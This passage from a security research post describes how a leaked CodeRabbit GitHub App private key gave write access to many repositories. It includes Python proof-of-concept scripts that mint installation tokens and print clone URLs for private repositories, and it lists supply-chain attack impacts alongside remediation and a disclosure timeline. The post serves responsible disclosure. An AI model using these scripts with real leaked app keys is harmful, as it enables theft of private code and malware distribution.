<p>As mentioned above, one of the environment variables was named <code>GITHUB_APP_PEM_FILE</code> and its value contained a private key. This is actually the private key of the CodeRabbit GitHub app. This private key can be used to authenticate to the GitHub REST API and act on behalf of the CodeRabbit GitHub app. Since users of CodeRabbit have granted CodeRabbit write access to their repositories, this private key gives us write access to 1 million repositories!</p>



<p>Let’s go through a few operations that one can perform with this private key.</p>



<h3>Listing installations of the CodeRabbit app</h3>



<p>As of writing, the CodeRabbit GitHub app was installed over 80’000 times. Basically, this tells us that at least that amount of GitHub personal accounts or organizations installed CodeRabbit and use it for at least one of their repositories. But these accounts may very well have granted access to more than one repository, or even all of their repositories.</p>



<p>The CodeRabbit website states that they review 1M repositories. These include GitHub repositories, but likely also repositories from other platforms that CodeRabbit supports, such as Gitlab, and on-premises git providers.</p>



<p>We will see below (see Proof of concept) how one can programatically list GitHub app installations using the GitHub API.</p>



<h3>Listing GitHub repositories CodeRabbit has access to</h3>



<p>For a given installation, one can list the GitHub repositories to which this installation has been granted access.</p>



<p>We can also see that the installation has read/write access to the code of the repository, among other permissions. For reference, this is the list of permissions the CodeRabbit app has on the repositories it has access to:</p>


<div><pre title="">"permissions": {
    "actions": "read",
    "checks": "read",
    "contents": "write",
    "discussions": "read",
    "issues": "write",
    "members": "read",
    "metadata": "read",
    "pull_requests": "write",
    "statuses": "write"
  },
</pre></div>


<p>Note that these permissions are public information that anyone can <a href="https://api.github.com/apps/coderabbitai">see here</a>.</p>



<h3>Generating an access token valid for repositories that CodeRabbit has access to</h3>



<p>A GitHub API access token can be created for the CodeRabbit app installation. This access token has all the permissions listed above and can be used on all the repositories the app installation has access to. It can be used to, for example, clone the repository or push git commits to it, since we not only have read access but also write access to the <code>contents</code>. This can also be used to update GitHub releases, including the downloadable files (the assets), and replace them with malware and therefore serve malware directly from the targeted official GitHub repository.</p>



<p>The access token is valid for at most 10 minutes, but since we have the private key, more access tokens can be generated at any time, even if they expire.</p>



<h3>Cloning private repositories CodeRabbit has access to</h3>



<p>But this gets even scarier. Generated access tokens can also be used to clone private repositories (!) that the user has granted CodeRabbit access to. Indeed, as long as the user has granted CodeRabbit access to a repository, the private key can be used to access it. It doesn’t matter if it’s public or private.<br>Therefore, a malicious person could exploit the vulnerability to leak the CodeRabbit GitHub app private key, list all the installations, list each repository, generate an access token for each repository, and clone private repositories, serve malware from public repositories or manipulate the git history of a repository. This could be used to perform lateral movement and potentially leak GitHub repository secrets of the GitHub repository through GitHub actions if the targeted repository contains vulnerable GitHub actions.</p>



<h2>Proof of concept</h2>



<p>Here’s an example of how this can be achieved using the PyGitHub Python library, assuming that the private key is stored in a file called <code>priv.pem</code> and that we have the app ID and client ID (also leaked from the environment variables):</p>


<div><pre title="">#!/usr/bin/env python3  
import json  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "TODO_insert_app_id_here"  
client_id = "Iv1.TODO_insert_client_id_here"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def create_access_token(install_id, jwt):  
    response = requests.post(  
        f"https://api.github.com/app/installations/{install_id}/access_tokens",  
        headers={  
            "Accept": "application/vnd.github+json",  
            "Authorization": f"Bearer {jwt}",  
            "X-GitHub-Api-Version": "2022-11-28",  
        }  
    )  
    j = response.json()  
    access_token = j["token"]  
    return access_token  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  
    app = gi.get_app()  

    # iterate through app installations, get the first 5  
    for installation in gi.get_installations().reversed[:5]:  
        install_id = installation.id  

    # or access an installation by its ID directly  
    installation = gi.get_app_installation(install_id)  

    jwt = gen_jwt()  
    create_access_token(install_id, jwt)  

    # get all github repositories this installation has access to  
    repos = installation.get_repos()  
    for repo in repos:  
        full_name = repo.full_name  
        stars = repo.stargazers_count  
        html_url = repo.html_url  
        is_private_repo = repo.private  
        clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
        print(clone_url)  

        # repo can be cloned with "git clone {clone_url}"  
        # access token is valid for 10 minutes, but a new one can be generated whenever needed  

if __name__ == "__main__":  
    auth()
</pre></div>


<p>Obviously, iterating through the list of all GitHub installations of the CodeRabbit app would have required making thousands of requests to the GitHub API on behalf of the production CodeRabbit GitHub app and this may have exceeded the API quota. We didn’t want to risk disrupting the production CodeRabbit service so we only iterated through a couple installations to confirm the PoC was working.</p>



<h2>Leaking CodeRabbit’s private repositories</h2>



<p>We mentioned earlier that we couldn’t confirm the presence of the original source code of CodeRabbit on the production Docker container. Well, since CodeRabbit eats their own dog food, they run CodeRabbit on their own GitHub repositories. We can therefore easily retrieve the app installation ID for their GitHub organization and list the repositories this app installation has access to.</p>



<p>This is the list of private repositories the coderabbitai GitHub organization has granted CodeRabbit access to:</p>



<ul>
<li><a href="https://github.com/coderabbitai/mono" rel="nofollow">https://github.com/coderabbitai/mono</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-saas" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-saas</a></li>



<li><a href="https://github.com/coderabbitai/e2e-reviewer" rel="nofollow">https://github.com/coderabbitai/e2e-reviewer</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-client" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-client</a></li>



<li><a href="https://github.com/coderabbitai/db-client" rel="nofollow">https://github.com/coderabbitai/db-client</a></li>



<li><a href="https://github.com/coderabbitai/rabbits-lab" rel="nofollow">https://github.com/coderabbitai/rabbits-lab</a></li>



<li><a href="https://github.com/coderabbitai/website" rel="nofollow">https://github.com/coderabbitai/website</a></li>



<li><a href="https://github.com/coderabbitai/hubspot-reporting" rel="nofollow">https://github.com/coderabbitai/hubspot-reporting</a></li>
</ul>



<p>To go further, one can generate an access token (as explained above) and clone these private repositories, including what looks like their monorepo (<code>coderabbitai/mono</code>) or the <code>coderabbitai/pr-reviewer-saas</code> repository.</p>



<p>Here’s the PoC to do this. Note that it’s similar to the above, except that we directly retrieve the app installation for a specific GitHub organization by its name, instead of iterating through all the installations:</p>


<div><pre title="">#!/usr/bin/env python3  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "CENSORED"  
client_id = "CENSORED"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  

    # Target a specific Github organization that uses CodeRabbit  
    org = "coderabbitai"    
    installation = gi.get_org_installation(org)  

    # Target a specific Github user that uses CodeRabbit
    # user = "amietn"  
    # installation = gi.get_user_installation(user)  

    print(installation.id)  
    gen_token = True  

    if gen_token:  
        jwt = gen_jwt()  
        response = requests.post(  
            f"https://api.github.com/app/installations/{installation.id}/access_tokens",  
            headers={  
                "Accept": "application/vnd.github+json",  
                "Authorization": f"Bearer {jwt}",  
                "X-GitHub-Api-Version": "2022-11-28",  
            }  
        )  
        j = response.json()  
        access_token = j["token"]  

    repos = installation.get_repos()  
    print("---repos---")  
    for repo in repos:  
        full_name = repo.full_name  
        html_url = repo.html_url  
        private = repo.private  
        if private:  
            print(f"* {full_name} ({private=}) - {html_url}")  

            if gen_token:  
                clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
                print(clone_url)  


if __name__ == "__main__":  
    auth()
</pre></div>


<p>In a similar way, a malicious person could target not only a specific GitHub organization but also a specific GitHub personal account that uses CodeRabbit and access their private repositories and/or modify them.</p>



<p>As you can see, one can directly obtain the app installation ID for an organization or a user. So, this way there is no need to iterate through all the GitHub app installations to find a specific GitHub user or organization. Only the organization or user’s name is required.</p>



<h2>Impacts summary</h2>



<p>Let’s take a moment to summarize the impacts of getting write access to these 1 million repositories. A malicious person could have performed the following operations on affected repositories:</p>



<ul>
<li>Access private GitHub repositories nobody was ever supposed to access. This is a privacy breach.</li>



<li>Modify the git history of affected GitHub repositories – Note that this can be a supply chain attack since GitHub repositories are often the source for building software before it’s distributed</li>



<li>Modify existing GitHub releases and replace or add malicious downloadable files – Supply chain attack</li>



<li>Further lateral moves to potentially leak GitHub repository secrets by exploiting existing vulnerable GitHub actions by pushing git commits – Note that since the CodeRabbit GitHub app doesn’t have write permission to workflows, GitHub actions can’t be directly modified. However, a vulnerable GitHub action may be exploited more easily with write access to the git repository. See the talk I gave at 38C3 for more details on how we found an instance where this was exploitable.</li>
</ul>



<p>Additionally, we obtained RCE on the CodeRabbit production system. A malicious person could have performed destructive operations, caused a denial of service, or performed malicious operations on third party systems (see list of leaked secrets above).</p>



<h2>Context is key</h2>



<p>While running the exploit, CodeRabbit would still review our pull request and post a comment on the GitHub PR saying that it detected a critical security risk, yet the application would happily execute our code because it wouldn’t understand that this was actually running on their production system.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png"><img data-attachment-id="20121" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/coderabbit-review/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png" data-orig-size="1983,1224" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coderabbit-review" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=840" loading="lazy" width="1024" height="632" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=1024" alt=""></a><figcaption>CodeRabbit’s code review of the exfiltration PoC PR</figcaption></figure>



<h2>Remediation</h2>



<p>CodeRabbit supports running dozens of external tools. These tools may get updates and new tools may be supported. Both cases may open the door to new ways of running arbitrary code. Therefore, trying to prevent arbitrary code execution through these tools sounds like an impossible task.</p>



<p>Instead, it would be best to assume that the user may be able to run untrusted code through these tools. So, running them in an isolated environment, with only the minimum information required to run the tools themselves, and not passing them any environment variables would be much better. Even if arbitrary code execution would be possible, the impact would be much less severe.</p>



<p>For defense in depth, one should add a mechanism that prevents sending private information to an attacker-controlled server. For example, only allow outgoing traffic to whitelisted hosts, if possible. If the tool doesn’t require internet access, then all network traffic may even be disabled in that isolated environment. This way it would make it harder for an attacker to exfiltrate secrets.</p>



<h2>Responsible disclosure</h2>



<p>After responsibly disclosing this critical vulnerability to the CodeRabbit team, we learned from them that they had an isolation mechanism in place, but Rubocop somehow was not running inside it. The CodeRabbit team was extremely responsive and acknowledged receipt of the disclosure the same day. They immediately disabled Rubocop and rotated the secrets and started working on a fix. The next week they told us that the vulnerability had been fixed. Kudos to the CodeRabbit team for responding promptly and fixing the issue.</p>



<p>Here is a summary of the disclosure timeline:</p>



<ul>
<li>January 24, 2025:
<ul>
<li>Disclose vulnerability to CodeRabbit</li>



<li>CodeRabbit acknowledges vulnerability and confirms they are working on a fix</li>
</ul>
</li>



<li>January 30, 2025:
<ul>
<li>CodeRabbit confirms fix</li>
</ul>
</li>
</ul>



<h2>Conclusions</h2>



<p>In the end, we only provided PoCs and didn’t take things further. A patient attacker could have enumerated the available access, identified the highest value targets, and then attacked those targets to distribute malware to countless others in a larger supply chain attack. Security is hard, and a variety of factors can come together to create security issues. Being quick to respond and remediate, as the CodeRabbit team was, is a critical part of addressing vulnerabilities in modern, fast-moving environments. Other vendors we contacted never responded at all, and their products are still vulnerable.</p>



<p>In the race to bring AI-powered products to market, many companies prioritize speed over security. While rapid innovation is exciting, overlooking security can have catastrophic consequences, as we’ve seen. The solution isn’t to stop but to build security into the development process from day one. By making security a core priority, AI companies can create products that are not only groundbreaking but also resilient and responsible. After all, true innovation isn’t just about moving fast. It’s about building something resilient and safe for users.</p>

		
	</div></div>]]></description>
        </item>
    </channel>
</rss>